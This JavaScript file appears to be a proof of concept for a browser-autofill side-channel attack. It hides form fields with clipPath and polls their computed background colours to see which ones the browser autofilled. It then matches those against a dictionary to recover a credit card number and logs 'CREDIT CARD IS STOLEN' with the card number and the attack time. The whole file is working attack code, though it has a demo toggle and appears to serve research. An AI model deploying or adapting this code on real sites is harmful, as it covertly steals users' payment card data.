var color_str = "rgb(232, 240, 254)";
var isclick = 0;
var items = {};
var drop_down = document.getElementById("hidden_info")
var cardmonth = document.getElementById("cardmonth");

drop_down.style.clipPath = "circle(0%)"

fetch('input_cc100k.txt')
.then(response => response.text())
.then(text => drop_down.innerHTML=text)

fetch('dict_cc.json')
.then(response => response.json())
.then(jsonResponse => items = jsonResponse)

var startTime, endTime;

const start = () => {
  startTime = new Date();
  console.log('starting counting time')
};

const calculateTheAttackTime = () => {
  endTime = new Date();
  var timeDiff = endTime - startTime; //in ms
  // strip the ms
  timeDiff /= 1000;
  // get seconds
  var seconds = Math.round(timeDiff);
  return seconds;
}

var select_html;
new JSZip.external.Promise((resolve, reject) => {
  JSZipUtils.getBinaryContent('select_cc100k.txt.zip', (err, data) => {
      if (err) {
          reject(err);
      } else {
          resolve(data);
      }
  });
}).then((binaryContent) => {
  return JSZip.loadAsync(binaryContent);
}).then((zip) => {
  return zip.file("select_cc100k.txt").async("text");
}).then((txt) => {
  select_html = txt;
})

const changeElements = () => {
  // drop_down.innerHTML = "";
  start();
  drop_down.innerHTML = select_html;
  cardmonth.innerHTML = 'Credit Card Expiry Month<select name="ccmonth" id="ccmonth"><option value="03">03</option></select>';
  console.log('Data has been fetched and content of dropdown loaded!')
  isclick = 1;
}

const checkIfEqual = (first, second) => {
  if (first === second) return true;
  if (first == null || second == null) return false;
  if (first.length != second.length) return false;

  for (var i = 0; i < first.length; ++i) {
    if (first[i] !== second[i]) return false;
  }
  return true;
}

var cardname = document.getElementById("cardname");
var flag = 0;
var items = {};
var matched_flag = 0;
var result = document.getElementById("result");
var intervalId = null;

intervalId = setInterval( () => {
  var results = [];
  var matched;
  var ccmonth = document.getElementById("ccmonth");
  if (getComputedStyle(ccmonth).backgroundColor == color_str){
      console.log("start");
      flag = 1;
  }
  if(flag ==1 && results.length < 1){
      var selects = drop_down.children;
      for (var i = 0; i < selects.length; i++) {
          if (getComputedStyle(selects[i]).backgroundColor != color_str){
              if(selects[i].id && selects[i].tagName == "SELECT"){
                  results.push(parseInt(selects[i].id));
                  console.log("results", results);
              }
          }
      }
  }
  for (var key in items) {
    var value = items[key];
    if (checkIfEqual(value, results)){
        var matched = key;
        break;
  }
  }

if (matched){
    var time_diff = calculateTheAttackTime();
    console.log("CREDIT CARD IS STOLEN: ")
    console.log("CARD NUMBER: 41234567890"+matched)
    console.log("Attack took: " + time_diff + 's')
    matched_flag = 1;
    clearInterval(intervalId);
}

var isFocused = (document.activeElement === cardname);

if(!isFocused && !matched_flag){
    if(getComputedStyle(cardname).backgroundColor != color_str){
      fetch('input_cc100k.txt')
          .then(response => response.text())
          .then(text => drop_down.innerHTML=text)
            cardmonth.innerHTML = 'Credit Card Expiry Month<input type="text" name="ccmonth" id="ccmonth" placeholder="ccmonth">';
          }

}
},1000);

const revealDropdowns = () => {
  var showbutton = document.getElementsByClassName("button")[0];
  if (drop_down.style.clipPath === 'circle(0% at 50% 50%)') {
      drop_down.style.clipPath = "circle(100% at 50% 50%)";
      showbutton.innerHTML = "Hide fields";
  }else {
      drop_down.style.clipPath = "circle(0% at 50% 50%)";
      showbutton.innerHTML = "Show hidden fields";
  }
}
